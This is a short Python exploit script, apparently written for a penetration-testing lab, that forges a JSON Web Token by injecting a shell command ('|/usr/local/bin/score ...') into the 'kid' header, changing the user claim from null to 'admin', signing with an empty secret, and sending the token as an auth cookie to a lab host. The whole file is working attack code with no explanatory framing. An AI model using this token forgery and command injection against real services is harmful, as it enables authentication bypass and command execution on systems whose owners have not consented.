#eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
#header - {"typ":"JWT","alg":"HS256","kid":"0001"}
#payload - {"user":null}
import re
import base64
import hmac
import hashlib
import urllib.request


def decode(string):
    return base64.b64decode(string).decode('utf-8')
def encode(string):
    return base64.urlsafe_b64encode(bytes(string, encoding="utf-8")).decode('utf-8').rstrip("=")

def send(header):
    cookie = {"Cookie": "auth=cookie"}
    url = "http://ptl-14dcdcce-32c35a08.libcurl.so/"
    cookie["Cookie"] = "auth=cookie".replace("cookie", header)
    print("Trying - ", header, "\n")
    try: 
        request=urllib.request.Request(url, headers=cookie)
        response=urllib.request.urlopen(request)
        print(response.read())
    except urllib.error.HTTPError as err:
        print(str(err))

def sign(data):
    SECRET = ""
    #python-2
    #signature = base64.urlsafe_b64encode(hmac.new(SECRET, token, hashlib.sha256).digest()).decode("utf8").rstrip("=")
    #python-3
    signature = base64.urlsafe_b64encode(hmac.new(bytes(SECRET, encoding="utf8"), data.encode('utf-8'), hashlib.sha256).digest()).decode("utf8").rstrip("=")
    return data + "."+signature

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ==.eyJ1c2VyIjpudWxsfQ==.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y"
header, payload, signature = token.split(".")
decoded_header = decode(header)
decoded_payload = decode(payload)
#change_kid(decoded_header, payload, signature)
new_header = decoded_header.replace(re.search("\\d\\d\\d\\d", decoded_header)[0], "|/usr/local/bin/score 5477fae0-6fde-42c7-af14-feddcfd15e53")
new_payload = decoded_payload.replace("null",'"admin"')
print(new_header, new_payload)
new_header = encode(new_header)
new_payload = encode(new_payload)

print(new_header, new_payload)
new_token = sign(new_header+"."+new_payload)
send(new_token)






